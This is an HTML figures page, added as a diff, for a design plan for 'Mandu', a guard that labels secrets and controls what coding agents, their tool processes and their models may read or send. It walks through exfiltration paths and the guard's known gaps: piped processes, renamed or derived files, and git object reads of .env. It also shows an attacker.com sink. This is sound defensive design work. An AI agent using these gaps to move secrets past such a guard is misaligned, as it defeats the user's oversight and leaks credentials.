@@ -1,0 +1,1562 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reader-set labels</title>
+<style>
+:root {
+  --ink:#1f1f1f; --muted:#6b6b6b; --line:#8a8a8a;
+  --secret:#b3261e; --secret-bg:#fbe9e7;
+  --mid:#8a5a00; --mid-bg:#fbf0dc;
+  --ok:#2e6b3a; --ok-bg:#e8f2ea;
+  --ph:#e6e6e6; --bg:#ffffff;
+  color-scheme: light dark;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --ink:#e6e6e6; --muted:#a3a3a3; --line:#7a7a7a;
+    --secret:#f08a82; --secret-bg:#3b1e1b;
+    --mid:#e0b35c; --mid-bg:#3a2d12;
+    --ok:#8ccb9a; --ok-bg:#1c3122;
+    --ph:#2a2a2a; --bg:#141414;
+  }
+}
+:root[data-theme="dark"] {
+  --ink:#e6e6e6; --muted:#a3a3a3; --line:#7a7a7a;
+  --secret:#f08a82; --secret-bg:#3b1e1b;
+  --mid:#e0b35c; --mid-bg:#3a2d12;
+  --ok:#8ccb9a; --ok-bg:#1c3122;
+  --ph:#2a2a2a; --bg:#141414;
+}
+html { background: var(--bg); }
+body {
+  margin: 0; padding: 24px 16px 48px;
+  background: var(--bg); color: var(--ink);
+  font: 14px/1.45 system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+main { max-width: 960px; margin: 0 auto; }
+h1 { font-size: 18px; font-weight: 600; margin: 0 0 8px; }
+h2 { font-size: 14px; font-weight: 600; margin: 36px 0 12px; }
+h3 { font-size: 13px; font-weight: 600; margin: 16px 0 8px; }
+p { margin: 0 0 10px; }
+ol, ul { margin: 0 0 10px; padding-left: 22px; }
+li { margin: 0 0 6px; }
+code, .mono { font-family: ui-monospace, "SFMono-Regular", Menlo, Consolas, "Liberation Mono", monospace; font-size: 12px; }
+figure { margin: 0 0 8px; }
+figcaption { font-size: 13px; margin: 10px 0 0; }
+p.note { font-size: 12px; color: var(--muted); margin: 8px 0 0; }
+span.muted { color: var(--muted); }
+svg { display: block; width: 100%; height: auto; overflow: visible; }
+.fig { overflow-x: auto; }
+.fig svg { min-width: 760px; }
+.tw { overflow-x: auto; }
+table { border-collapse: collapse; width: 100%; font-size: 13px; }
+th, td { border: 1px solid var(--line); padding: 5px 8px; text-align: left; vertical-align: top; }
+th { font-weight: 600; border-bottom: 1px solid var(--ink); }
+td.k { font-weight: 600; white-space: nowrap; }
+
+/* outcome chips */
+.chip { display: inline-block; padding: 0 6px; border: 1px solid var(--line); border-radius: 3px; font-size: 12px; white-space: nowrap; }
+.chip.raw { color: var(--secret); border-color: var(--secret); background: var(--secret-bg); }
+.chip.sym { background: var(--ph); }
+.chip.ask { color: var(--mid); border-color: var(--mid); background: var(--mid-bg); }
+.chip.deny { color: var(--secret); border-color: var(--secret); }
+.chip.ok { color: var(--ok); border-color: var(--ok); background: var(--ok-bg); }
+
+/* verdict rows under a timeline */
+.verdicts { display: grid; grid-template-columns: 170px 1fr; gap: 6px 14px; margin-top: 12px; font-size: 13px; }
+@media (max-width: 700px) { .verdicts { grid-template-columns: 1fr; } }
+.verdicts .v-bad { color: var(--secret); font-weight: 600; }
+.verdicts .v-mid { color: var(--mid); font-weight: 600; }
+.verdicts .v-ok { color: var(--ok); font-weight: 600; }
+
+/* the reader-set matrix */
+table.mx th, table.mx td { text-align: center; padding: 4px 5px; }
+table.mx td.f, table.mx th.f { text-align: left; white-space: nowrap; }
+table.mx th.grp { border-bottom: 1px solid var(--line); font-weight: 600; }
+table.mx th.p { font-weight: 400; font-size: 12px; white-space: nowrap; }
+table.mx td.base { color: var(--ink); }
+table.mx td.grant { color: var(--ok); font-weight: 600; }
+table.mx td.none { color: var(--muted); }
+table.mx td.bad { color: var(--secret); background: var(--secret-bg); font-weight: 600; }
+table.mx tr.div td { background: var(--ph); text-align: left; font-size: 12px; }
+.lv { font-size: 12px; white-space: nowrap; }
+.lv.public { color: var(--ok); }
+.lv.mid { color: var(--mid); }
+.lv.hi { color: var(--secret); }
+
+
+/* Figure 8: explorer */
+.ex { border: 1px solid var(--line); padding: 14px; display: grid; gap: 14px; }
+.ex-controls { display: flex; flex-wrap: wrap; gap: 10px 16px; align-items: end; }
+.ex-controls label { display: grid; gap: 4px; font-size: 12px; color: var(--muted); }
+.ex-controls select, .ex-mode button { font: inherit; font-size: 13px; color: var(--ink); background: var(--bg); border: 1px solid var(--line); padding: 4px 6px; max-width: 100%; }
+.ex-mode { display: flex; }
+.ex-mode button { cursor: pointer; }
+.ex-mode button + button { border-left: 0; }
+.ex-mode button[aria-pressed="true"] { background: var(--ink); color: var(--bg); border-color: var(--ink); }
+.ex-controls select:focus-visible, .ex-mode button:focus-visible { outline: 2px solid var(--ok); outline-offset: 1px; }
+.ex-steps { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
+@media (max-width: 700px) { .ex-steps { grid-template-columns: 1fr; } }
+.ex-step { border-top: 2px solid var(--ink); padding-top: 8px; font-size: 13px; min-width: 0; }
+.ex-h { font-size: 12px; font-weight: 600; letter-spacing: 0.04em; margin-bottom: 6px; }
+
+/* SVG classes (shared with flow-confidentiality.html) */
+.bx { fill: var(--bg); stroke: var(--ink); stroke-width: 1; }
+.bx-secret { fill: var(--secret-bg); stroke: var(--secret); stroke-width: 1; }
+.bx-secret-o { fill: var(--bg); stroke: var(--secret); stroke-width: 1; }
+.bx-mid { fill: var(--bg); stroke: var(--mid); stroke-width: 1; }
+.bx-ok { fill: var(--ok-bg); stroke: var(--ok); stroke-width: 1; }
+.bx-ph { fill: url(#hatch); stroke: var(--ink); stroke-width: 1; stroke-dasharray: 3 2; }
+.gate { fill: var(--ph); stroke: var(--ink); stroke-width: 1; }
+.grp { fill: none; stroke: var(--line); stroke-width: 1; stroke-dasharray: 4 3; }
+.ln { fill: none; stroke: var(--ink); stroke-width: 1; }
+.ln-a { marker-end: url(#ah); }
+.ln-d { stroke-dasharray: 4 3; }
+.ln-ok { fill: none; stroke: var(--ok); stroke-width: 1; marker-end: url(#ah-ok); }
+.ln-secret { fill: none; stroke: var(--secret); stroke-width: 1; marker-end: url(#ah-secret); }
+.ln-sep { fill: none; stroke: var(--line); stroke-width: 1; stroke-dasharray: 4 3; }
+.dot { fill: var(--ink); }
+.dot-secret { fill: var(--secret); }
+svg text { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 12px; fill: var(--ink); }
+svg text.m, svg tspan.m { font-family: ui-monospace, "SFMono-Regular", Menlo, Consolas, "Liberation Mono", monospace; font-size: 11px; }
+svg text.s11, svg tspan.s11 { font-size: 11px; }
+svg text.s13 { font-size: 13px; }
+svg text.b, svg tspan.b { font-weight: 600; }
+svg text.muted, svg tspan.muted { fill: var(--muted); }
+svg text.secret, svg tspan.secret { fill: var(--secret); }
+svg text.mid, svg tspan.mid { fill: var(--mid); }
+svg text.ok, svg tspan.ok { fill: var(--ok); }
+.c { text-anchor: middle; }
+.e { text-anchor: end; }
+table.mx td.na { color: var(--muted); font-size: 12px; font-style: italic; }
+
+/* Figure 9: the policy file, the sentences, the approval */
+pre { font-family: ui-monospace, "SFMono-Regular", Menlo, Consolas, "Liberation Mono", monospace; font-size: 12px; line-height: 1.45; margin: 0 0 10px; padding: 10px 12px; border: 1px solid var(--line); background: var(--bg); color: var(--ink); overflow-x: auto; }
+pre .cm { color: var(--muted); }
+.say { border-left: 3px solid var(--line); padding: 4px 0 4px 12px; margin: 0 0 10px; }
+.card { border: 1px solid var(--line); padding: 12px 14px; display: grid; gap: 6px; max-width: 680px; font-size: 13px; }
+.card .src { color: var(--muted); }
+.card .btns { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 4px; }
+.card .btn { border: 1px solid var(--line); border-radius: 3px; padding: 2px 8px; font-size: 12px; }
+.card .btn.pri { border-color: var(--ink); font-weight: 600; }
+</style>
+</head>
+<body>
+<main>
+<h1>Reader-set labels: Plan 13 in figures <span class="muted">(design 2026-09-28, revised 2026-09-30; the figures show the code as of 2026-09-30, before the D1 to D9 fixes: see the plan's status for what is built since)</span></h1>
+<p class="note">Figures for <a href="../confidentiality-plan-13-reader-set-labels.md"><code>confidentiality-plan-13-reader-set-labels.md</code></a>. Mode <code>secrets</code> (the confidentiality axis only). "Today" means the code as of 2026-09-30, before the defect fixes; "Plan 13" means the revised design of that plan's §4 and §5. D1 to D8 are the defects of its §3. Figures 10 to 15 (2026-10-01) review the revision: what it still does not cover, and how to address it (the plan's §9).</p>
+
+<!-- shared defs -->
+<svg width="0" height="0" style="position:absolute;width:0;height:0" aria-hidden="true">
+  <defs>
+    <pattern id="hatch" width="6" height="6" patternUnits="userSpaceOnUse" patternTransform="rotate(45)">
+      <rect width="6" height="6" fill="var(--ph)"/>
+      <line x1="0" y1="0" x2="0" y2="6" stroke="var(--line)" stroke-width="1" opacity="0.7"/>
+    </pattern>
+    <marker id="ah" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0.5 L8,4 L0,7.5 z" fill="var(--ink)"/>
+    </marker>
+    <marker id="ah-ok" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0.5 L8,4 L0,7.5 z" fill="var(--ok)"/>
+    </marker>
+    <marker id="ah-secret" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0.5 L8,4 L0,7.5 z" fill="var(--secret)"/>
+    </marker>
+  </defs>
+</svg>
+
+<!-- ============ The frame ============ -->
+<h2>The frame: objects, holders, sinks</h2>
+<p>Objects (data) on the left, holders in the middle, and sinks on the right. A <b>holder</b> is whoever holds raw bytes: the agent's session, one tool call's process tree, a long-lived process. A <b>sink</b> is where bytes can go that Mandu can see: a model (a declared endpoint), a destination (a host, a socket, a synced folder), storage (any other file), the human. Mandu acts at three gates: when a program <b>opens</b> an object, when a holder <b>sends</b> to a sink, and when it <b>writes</b> a file.</p>
+<p><b>Programs are not sinks.</b> A program is an <b>opener</b>: it is checked at the read gate against the file's reader list, and nowhere else. The label that travels with the data names sinks only. The OS layer cannot back more: once bytes are inside a tool call's process tree, it cannot tell which program holds them (in <code>python3 … | tee</code>, <code>tee</code> holds the data and is no reader). Plan 13's §4 is this frame written as a lattice. Six refinements keep the frame faithful to what Mandu actually does:</p>
+<ol>
+  <li><b>Files are on both sides.</b> A write is a sink, and the written file becomes an object again, referring to the labels of the data its writer held. A label that is wrong at the write is wrong at every later read. Today it is wrong in two ways. A derived file is served raw to every program: the guard's index loads once and never learns derived paths, and <code>mv</code> drops the label (D4). A file opened before the read gets no label at all (D5).</li>
+  <li><b>The user is on both sides too.</b> Prompts are objects. The human terminal is a sink that always sees originals (the reply filter). Today a prompt is public without condition: user-role text is forwarded raw, so a pasted key reaches the provider. Plan 13 §4.8 records the decision to scan prompts for the values of registered secrets and replace each with its symbol. The scan for secret shapes is withdrawn, after Plan 14 §1 rejected masking by shape (Figure 6).</li>
+  <li><b>The agent is not an ordinary program.</b> Its process only ever gets the twin, and what it reads goes straight into its model's context. For the agent, <i>read</i> and <i>send to the model</i> are one event at one chokepoint, the model-API proxy. Its holder is the session, and the session's label is the watermark. That is why the level (which models may see the data) is the column that separates the four levels.</li>
+  <li><b>Holders carry labels, and data moves between processes.</b> A holder that reads a secret raw keeps a label that only shrinks, and passes data on through pipes and sockets. A check made only at the open (access control) cannot see <code>A | B</code> or a holder that read two files. The label must travel with the holder: this is information-flow control, not access control alone. That fourth arrow, process to process, is where the defects D1 and D2 live. Plan 13 approximates it by treating one tool call's process tree as one holder, which needs the tree recorded at fork and exec (D7).</li>
+  <li><b>The outcome is not allow or deny.</b> Each gate has four outcomes: <span class="chip raw">raw</span> <span class="chip sym">symbol / twin</span> <span class="chip ask">ask</span> <span class="chip deny">hard deny</span>. The symbol is the dual view: the holder keeps working on data it cannot see. An approval defaults to once: an Inbox row offers <i>Deny</i>, <i>Allow once</i>, <i>Allow this session</i> and <i>Always</i>, and only <i>Always</i> writes to the policy.</li>
+  <li><b>An object is data, not a path.</b> The same bytes live under other names: <code>.git/objects</code>, copies, caches. <code>git show HEAD:.env</code> never opens <code>.env</code>. The launcher's git object-store twins (<code>confidentiality.md</code> §7.2a) cover one such name; every other name needs a label of its own.</li>
+</ol>
+
+
+<!-- ============ Figure 1 ============ -->
+<h2>Figure 1. The architecture</h2>
+<figure>
+<div class="fig">
+<svg viewBox="0 0 960 560" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 1: objects, holders and sinks with the read, send and write gates">
+  <!-- column heads -->
+  <text class="c b s13" x="116" y="20">OBJECTS</text>
+  <text class="c s11 muted" x="116" y="36">labeled data</text>
+  <text class="c b s13" x="480" y="20">HOLDERS</text>
+  <text class="c s11 muted" x="480" y="36">each carries a label that only shrinks</text>
+  <text class="c b s13" x="852" y="20">SINKS</text>
+  <text class="c s11 muted" x="852" y="36">where the raw bytes may go</text>
+
+  <!-- objects -->
+  <rect class="bx" x="16" y="60" width="200" height="40"/>
+  <text class="c b" x="116" y="77">user</text>
+  <text class="c s11" x="116" y="92">prompts: data in, like a file</text>
+
+  <path class="bx" d="M16,112 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,112 v16 h16"/>
+  <text class="c m" x="108" y="131">README.md</text>
+  <text class="c s11 ok" x="108" y="146">public</text>
+
+  <path class="bx-mid" d="M16,164 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,164 v16 h16"/>
+  <text class="c m" x="108" y="183">docs/contract.pdf</text>
+  <text class="c s11" x="108" y="198"><tspan class="mid">any-model</tspan> · bind gmail.com</text>
+
+  <path class="bx-mid" d="M16,216 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,216 v16 h16"/>
+  <text class="c m" x="108" y="235">data/customers.csv</text>
+  <text class="c s11" x="108" y="250"><tspan class="mid">local-model</tspan> · readers report.py</text>
+
+  <path class="bx-secret-o" d="M16,268 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,268 v16 h16"/>
+  <text class="c m" x="108" y="287">.env</text>
+  <text class="c s11" x="108" y="302"><tspan class="secret">no-model</tspan> · report.py · github.com</text>
+
+  <path class="bx-secret-o" d="M16,320 h184 l16,16 v28 h-200 z"/><path class="ln" d="M200,320 v16 h16"/>
+  <text class="c m" x="108" y="339">~/.my.cnf</text>
+  <text class="c s11" x="108" y="354"><tspan class="secret">no-model</tspan> · mysql · db.internal</text>
+
+  <path class="bx-ph" d="M16,372 h184 l16,16 v28 h-200 z"/>
+  <text class="c m" x="108" y="391">.git/objects</text>
+  <text class="c s11" x="108" y="406">the same bytes, another name</text>
+
+  <path class="bx-secret-o" style="stroke-dasharray:4 3" d="M16,440 h184 l16,16 v28 h-200 z"/>
+  <text class="c m" x="108" y="459">derived file</text>
+  <text class="c s11" x="108" y="474">refers to its sources' labels</text>
+
+  <!-- read bus -->
+  <path class="ln" d="M216,80 H232 M216,134 H232 M216,186 H232 M216,238 H232 M216,290 H232 M216,342 H232 M216,394 H232 M216,462 H232 M232,80 V462"/>
+  <path class="ln ln-a" d="M232,230 H238"/>
+  <rect class="gate" x="240" y="60" width="40" height="424"/>
+  <text class="c b" transform="translate(264,272) rotate(-90)">READ · fs interposer (programs) · model-API proxy (agent)</text>
+  <path class="ln ln-a" d="M280,230 H294"/>
+
+  <!-- holders -->
+  <rect class="grp" x="296" y="54" width="368" height="324"/>
+  <rect class="bx" x="304" y="62" width="352" height="74"/>
+  <text class="c b" x="480" y="82">agent (Claude Code, Codex)</text>
+  <text class="c s11" x="480" y="99">its process only ever gets the twin;</text>
+  <text class="c s11" x="480" y="113">what it reads goes into its model's context</text>
+  <text class="c s11 muted" x="480" y="128">label: the session watermark</text>
+
+  <rect class="bx-secret" x="304" y="150" width="170" height="40"/>
+  <text class="c m" x="389" y="166">bash → python3</text>
+  <text class="c s11 secret" x="389" y="182">reads .env raw: tainted</text>
+  <rect class="bx" x="486" y="150" width="170" height="40"/>
+  <text class="c m" x="571" y="166">bash → curl</text>
+  <text class="c s11 muted" x="571" y="182">untainted</text>
+
+  <rect class="bx-secret" x="304" y="200" width="170" height="40"/>
+  <text class="c m" x="389" y="216">mysql</text>
+  <text class="c s11 secret" x="389" y="232">reads ~/.my.cnf raw</text>
+  <rect class="bx" x="486" y="200" width="170" height="40"/>
+  <text class="c m" x="571" y="216">bash → git show / log</text>
+  <text class="c s11 muted" x="571" y="232">reads .git/objects (twinned)</text>
+
+  <rect class="bx" x="304" y="250" width="170" height="40"/>
+  <text class="c m" x="389" y="266">bash → git commit</text>
+  <text class="c s11 muted" x="389" y="282">writes .git/objects</text>
+  <rect class="bx" x="486" y="250" width="170" height="40"/>
+  <text class="c m" x="571" y="266">any other program</text>
+  <text class="c s11 muted" x="571" y="282">twin, EACCES or ask</text>
+
+  <rect class="bx-ph" x="304" y="304" width="352" height="64"/>
+  <text class="c b" x="480" y="322">process → process: pipes, sockets, FIFOs</text>
+  <text class="c m" x="480" y="339">python3 … | curl …</text>
+  <text class="c s11" x="480" y="356">Plan 13: one tool call's process tree is one holder (D7)</text>
+
+  <!-- send gate -->
+  <path class="ln ln-a" d="M664,230 H688"/>
+  <rect class="gate" x="690" y="60" width="40" height="424"/>
+  <text class="c b" transform="translate(714,272) rotate(-90)">SEND · model-API proxy · net-guard / egress proxy · reply filter</text>
+  <path class="ln ln-a ln-d" d="M656,74 H688"/>
+  <text class="c s11 muted" x="720" y="50">agent: read = send</text>
+  <path class="ln ln-a" d="M730,230 H744"/>
+  <path class="ln" d="M746,80 V434"/>
+  <path class="ln ln-a" d="M746,80 H758 M746,124 H758 M746,168 H758 M746,220 H758 M746,260 H758 M746,300 H758 M746,340 H758 M746,380 H758 M746,434 H758"/>
+
+  <!-- sinks -->
+  <rect class="bx" x="760" y="62" width="184" height="36"/>
+  <text class="c b" x="852" y="77">external LLM</text>
+  <text class="c m" x="852" y="91">api.anthropic.com</text>
+  <rect class="bx" x="760" y="106" width="184" height="36"/>
+  <text class="c b" x="852" y="121">quarantined helper</text>
+  <text class="c s11" x="852" y="135">external, no main context</text>
+  <rect class="bx" x="760" y="150" width="184" height="36"/>
+  <text class="c b" x="852" y="165">local LLM</text>
+  <text class="c s11" x="852" y="179">declared <tspan class="m">local: true</tspan></text>
+
+  <rect class="bx" x="760" y="204" width="184" height="32"/>
+  <text class="c m" x="852" y="224">github.com</text>
+  <rect class="bx" x="760" y="244" width="184" height="32"/>
+  <text class="c m" x="852" y="264">gmail.com</text>
+  <rect class="bx" x="760" y="284" width="184" height="32"/>
+  <text class="c m" x="852" y="304">db.internal:3306</text>
+  <rect class="bx" x="760" y="324" width="184" height="32"/>
+  <text class="c m" x="852" y="344">attacker.com</text>
+  <rect class="bx" x="760" y="364" width="184" height="32"/>
+  <text class="c m" x="852" y="384">urlpost.com</text>
+
+  <rect class="bx-ok" x="760" y="414" width="184" height="40"/>
+  <text class="c b" x="852" y="431">human terminal</text>
+  <text class="c s11" x="852" y="446">reply filter shows originals</text>
+
+  <!-- write loop -->
+  <path class="ln ln-a" d="M480,378 V500"/>
+  <rect class="gate" x="300" y="502" width="360" height="40"/>
+  <text class="c b" x="480" y="519">WRITE · fs interposer, at the write-open</text>
+  <text class="c s11" x="480" y="534">the written file refers to its sources' labels</text>
+  <path class="ln ln-a" d="M300,522 H116 V486"/>
+  <text class="s11 muted" x="672" y="518">a synced folder is a SEND</text>
+  <text class="s11 muted" x="672" y="532">to <tspan class="m">sync:&lt;name&gt;</tspan> (Figure 5)</text>
+</svg>
+</div>
+<figcaption>Figure 1. Three gates, one label. "readers report.py" is python3 running the pinned script <code>/opt/tools/report.py</code>: an interpreter named alone admits nothing (Plan 13 §8 decision (b)). The read gate is the filesystem interposer for programs, which checks the program against the file's openers, and the model-API proxy for the agent, whose read is already a send to its model (dashed). The send gate is the model-API proxy (models), the net-guard at <code>connect()</code> and the egress proxy (destinations), and the reply filter (the human); a write-open under a synced folder is a send too. The egress proxy checks the sender's taint on every leg, HTTPS included, and the guard exempts only its port (D6, fixed 2026-10-02). The write gate makes the written file refer to its sources' labels, and the file re-enters the left column as an object. The dashed box in the middle is the fourth arrow, process to process, which no gate sees. Plan 13 approximates it by treating one tool call's process tree as one holder, which needs the tree recorded at fork and exec (D7).</figcaption>
+</figure>
+
+<!-- ============ Figure 2 ============ -->
+<h2>Figure 2. What a label is, and how it moves</h2>
+<figure>
+<h3>(a) A label is three relations</h3>
+<p>Every piece of data has a label with three parts. <b>Release</b> is the label proper: the set of sinks its raw bytes may reach (models, destinations, the human). It travels with the data, and the label of anything made from two pieces of data is the intersection of their Release sets. <b>Openers</b> is the reader list: the programs that may open the file raw. It is checked at the read gate only and does not travel. <b>Trust</b> says, for one opener, how much of its output still carries the file. It matters only at the model sink. A write to ordinary storage is not checked against Release: the written file takes the label with it (Figure 5).</p>
+<div class="tw"><table>
+  <thead><tr><th>relation</th><th>written in <code>policy.yaml</code> as</th><th>names</th><th>travels?</th><th>for <code>.env</code> in Figure 1</th></tr></thead>
+  <tbody>
+    <tr><td class="k">Release(d)</td><td><code>level: no-model</code><br><code>bindings: [github.com]</code></td><td>sinks: <code>Models(level) ∪ Bindings(d) ∪ {human, local storage}</code></td><td>yes, joined by intersection</td><td><b>{human, github.com}</b></td></tr>
+    <tr><td class="k">Openers(d)</td><td><code>readers: [{ app: python3,</code><br><code>&nbsp;&nbsp;script: /opt/tools/report.py }]</code></td><td>programs that may open it raw, pinned by path and hash; an interpreter only with the script it runs (<code>readers: [python3]</code> alone admits nothing, Plan 13 §8 decision (b))</td><td>no: the read gate only</td><td>{python3 running report.py}</td></tr>
+    <tr><td class="k">Trust(d, p)</td><td><code>output:</code> on the reader entry</td><td>one of <code>secret</code>, <code>mask</code>, <code>clear</code>: what the model sees of opener p's output</td><td>no: the model sink only</td><td>python3 running report.py: <code>secret</code> (the default)</td></tr>
+  </tbody>
+</table></div>
+<div class="tw" style="margin-top:12px"><table>
+  <thead><tr><th>level</th><th>public</th><th>any-model</th><th>local-model</th><th>no-model</th></tr></thead>
+  <tbody>
+    <tr><td class="k">Models(level)</td><td>every sink (public data is not secret: every destination too)</td><td>every declared model: the session's main model, the helper</td><td>the declared <code>local: true</code> models</td><td>none</td></tr>
+    <tr><td class="k">plus, always</td><td colspan="4">the human</td></tr>
+  </tbody>
+</table></div>
+<p style="margin-top:12px">Each gate asks one question of one relation. For <code>.env</code>:</p>
+<div class="tw"><table>
+  <thead><tr><th>who asks</th><th>checked against</th><th>in it?</th><th>outcome</th></tr></thead>
+  <tbody>
+    <tr><td>the agent's model (external) reads it</td><td>Release <code>{human, github.com}</code></td><td>no</td><td><span class="chip sym">symbol</span> it sees <code>$MDU:…</code> in place of the value</td></tr>
+    <tr><td><code>python3 -I /opt/tools/report.py</code> opens it</td><td>Openers <code>{python3 running report.py}</code></td><td>yes</td><td><span class="chip raw">raw</span> as an opener; its holder now holds <code>.env</code></td></tr>
+    <tr><td><code>python3 -c '…'</code>, or a renamed copy of python3, opens it</td><td>Openers <code>{python3 running report.py}</code></td><td>no</td><td><span class="chip deny">EACCES</span>, never asked: it runs code it is given (Plan 13 §8 decision (b); a copy by its hash, 2026-10-03)</td></tr>
+    <tr><td><code>curl</code> opens it</td><td>Openers <code>{python3 running report.py}</code></td><td>no</td><td><span class="chip deny">EACCES</span> (<code>others: deny</code>, the default once a list exists)</td></tr>
+    <tr><td>the data goes to <code>github.com</code></td><td>Release</td><td>yes</td><td><span class="chip ok">allowed</span></td></tr>
+    <tr><td>the data goes to <code>urlpost.com</code></td><td>Release</td><td>no</td><td><span class="chip ask">ask</span> the human</td></tr>
+  </tbody>
+</table></div>
+<p class="note">A "no" is a hard deny when no human act can help (any model on <code>no-model</code> data, an external model on <code>local-model</code> data); only a level change alters it. A "no" for a destination or a synced folder is an ask. Approvals default to once: an Inbox row offers <i>Deny</i>, <i>Allow once</i>, <i>Allow this session</i> and <i>Always</i>, and only <i>Always</i> adds the binding or the opener to the policy.</p>
+
+<h3>(b) Labels move: data to holder at a read, holder to data at a write</h3>
+<p>A file is not the only thing with a label. A <b>holder</b>, whoever holds raw bytes, carries one too: the agent's session after an in-context read (the watermark), one tool call's process tree, a long-lived process. A holder starts with every sink. Each raw read shrinks its label to what it had <b>and</b> what the new data allows, because it now holds both. A send is checked against the holder's label and changes nothing. A write makes the file refer to the data the holder holds. Opening a file as an opener grants nothing to any sink, and the right to open does not pass to the copy.</p>
+<div class="fig">
+<svg viewBox="0 0 960 210" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 2b: python3's holder label shrinking over two reads and a written file referring to both sources">
+  <rect class="bx" x="16" y="40" width="150" height="60"/>
+  <text class="c b" x="91" y="60">a tool call starts</text>
+  <text class="c s11" x="91" y="76">Label = every sink</text>
+  <text class="c s11 muted" x="91" y="91">holds nothing secret</text>
+
+  <path class="ln-secret" d="M166,70 H258"/>
+  <text class="c s11" x="212" y="56">opens .env raw</text>
+
+  <rect class="bx-secret" x="260" y="40" width="220" height="60"/>
+  <text class="c b" x="370" y="60">the call's tree</text>
+  <text class="c m" x="370" y="76">Label = {human, github.com}</text>
+  <text class="c s11 muted" x="370" y="91">every sink ∩ Release(.env)</text>
+
+  <path class="ln-secret" d="M480,70 H568"/>
+  <text class="c s11" x="524" y="50">opens</text>
+  <text class="c s11" x="524" y="63">customers.csv</text>
+
+  <rect class="bx-secret" x="570" y="40" width="190" height="60"/>
+  <text class="c b" x="665" y="60">the call's tree</text>
+  <text class="c m" x="665" y="76">Label = {human}</text>
+  <text class="c s11 muted" x="665" y="91">∩ {local LLM, human}</text>
+
+  <path class="ln-secret" d="M760,70 H818"/>
+  <text class="c s11" x="789" y="62">writes</text>
+
+  <path class="bx-secret-o" d="M820,40 h108 l16,16 v44 h-124 z"/>
+  <text class="c m" x="882" y="60">copy.txt</text>
+  <text class="c m" x="882" y="76">ref{.env,</text>
+  <text class="c m" x="882" y="89">customers.csv}</text>
+
+  <text class="c s11" x="91" y="124">connect anywhere: fine</text>
+  <text class="c s11" x="370" y="124"><tspan class="ok">github.com: allowed</tspan></text>
+  <text class="c s11" x="370" y="139"><tspan class="mid">urlpost.com: ask</tspan></text>
+  <text class="c s11" x="665" y="124"><tspan class="mid">github.com: ask</tspan></text>
+  <text class="c s11 muted" x="665" y="139">the customer rows were never</text>
+  <text class="c s11 muted" x="665" y="152">allowed to go there</text>
+  <text class="c s11" x="882" y="124">= {human}, when checked</text>
+  <text class="c s11" x="882" y="139">openers: nobody yet</text>
+  <text class="c s11 muted" x="882" y="152">every program: the twin</text>
+  <text class="s11 muted" x="16" y="182">This is Plan 13's design. Today github.com stays allowed after the second read (bindings are unioned, D1), and copy.txt records only the level,</text>
+  <text class="s11 muted" x="16" y="197">no-model, which the program gate never learns: every program opens it raw (D4).</text>
+</svg>
+</div>
+
+<h3>(c) Each gate: the question, and the bookkeeping</h3>
+<p class="note" style="margin:0 0 10px">A <b>symbol</b> stands in for one value (<code>$MDU:nomodel_Read[9bbd].STRIPE_KEY</code>) and is put back only where the label allows. A <b>twin</b> stands in for a whole file: the same structure with each value replaced by a symbol (<code>STRIPE_KEY='$MDU:nomodel_Read[9bbd].STRIPE_KEY'</code>), served at <code>open()</code> so a program can still parse and use it. A file whose shape Mandu does not know twins to one whole-file symbol.</p>
+<div class="tw"><table>
+  <thead><tr><th>gate</th><th>checked</th><th>if in</th><th>if not</th><th>label bookkeeping</th></tr></thead>
+  <tbody>
+    <tr><td class="k">READ, agent</td><td>the session's model against Release</td><td><span class="chip raw">raw</span> public data; <code>local-model</code> data for a declared local model</td><td><span class="chip sym">twin</span> the same twin a program gets; its model sees the symbols inside it</td><td>none for the twin. A raw in-context read (rung 3) shrinks the <b>session's</b> label to what it had and what the data allows: the watermark</td></tr>
+    <tr><td class="k">READ, program</td><td>the program (its pinned executable) against Openers</td><td><span class="chip raw">raw</span> a listed opener</td><td><span class="chip sym">twin</span> with no list; <span class="chip deny">EACCES</span> with one (or the twin under <code>others: twin</code>)</td><td>the program's <b>holder</b> (its tool call's tree) now holds the file: its label shrinks the same way. <b>Later event:</b> every sink the holder still has open must be in Release; an open socket outside it turns the read into an <span class="chip ask">ask</span> (or EACCES under a hard deny), and a file open for writing takes the label on the spot (D5)</td></tr>
+    <tr><td class="k">SEND, model</td><td>the session's main model against the call's label</td><td>the tool output as is</td><td><span class="chip sym">symbol</span>: the output of a call holding the file, under the opener's Trust (<code>secret</code> / <code>mask</code> / <code>clear</code>)</td><td>none</td></tr>
+    <tr><td class="k">SEND, network</td><td>the destination against the holder's label, on every leg: direct <code>connect()</code>, proxied HTTP, HTTPS through the MITM, a <code>CONNECT</code> tunnel</td><td><span class="chip ok">allowed</span>; a symbol is released at a binding</td><td><span class="chip ask">ask</span> (an Inbox row)</td><td>the destination joins the holder's open sinks, which every later raw read is checked against</td></tr>
+    <tr><td class="k">SEND, synced folder</td><td>a write-open under a sync root, as destination <code>sync:&lt;name&gt;</code></td><td><span class="chip ok">allowed</span></td><td><span class="chip ask">ask</span></td><td>as for the network</td></tr>
+    <tr><td class="k">SEND, human</td><td>the human</td><td><span class="chip ok">originals</span> always (reply filter)</td><td>n/a</td><td>none</td></tr>
